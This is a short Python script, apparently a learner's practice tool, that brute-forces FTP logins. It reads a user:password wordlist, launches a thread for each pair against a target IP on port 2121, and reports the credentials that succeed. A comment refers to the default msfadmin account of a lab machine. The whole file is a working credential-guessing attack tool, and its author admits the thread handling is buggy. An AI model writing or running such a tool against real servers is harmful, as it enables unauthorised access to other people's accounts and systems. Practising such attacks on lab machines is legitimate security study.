#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# combine two files
# paste -d ':' file1 file2 > combinedfile

import ftplib
import threading
import sys
import time

# are not working as I want, need to break the thread loop...

def bruteLogin(host, username, password):
  try:
    ftp = ftplib.FTP()
    ftp.connect(host,2121)
    # ftp = ftplib.FTP(host,2222)
    login = ftp.login(username, password)
    # login = ftp.login('msfadmin', 'msfadmin')
    print('[+] Login Succeeded With: {}/{}'.format(username, password))
    ftp.quit()
    sys.exit(0)
    # return(username,password)
  except:
    print('[*] Trying With: {}/{}'.format(username, password))
    pass

  # print('[-] Password Not in the List')


def main():
  host = input("[+] Enter Target IP Address: ")
  passwdFile = input("[+] Enter User/Password File Path: ")

  try:
    pF = open(passwdFile, "r")
  except:
    print('[!!] File Does not Exist!')
  for line in pF.readlines():
    username = line.split(':')[0]
    password = line.split(':')[1].strip('\n')
    # print('[*] Trying {}/{} '.format(username, password))
    t = threading.Thread(target=bruteLogin,args=(host,username,password))
    t.setDaemon(True)
    # t.daemon = True
    # t = threading.Thread(target=bruteLogin,args=(host,username,password),daemon=True)
    t.start()
    # bruteLogin(host, username, password)


main()
time.sleep(10)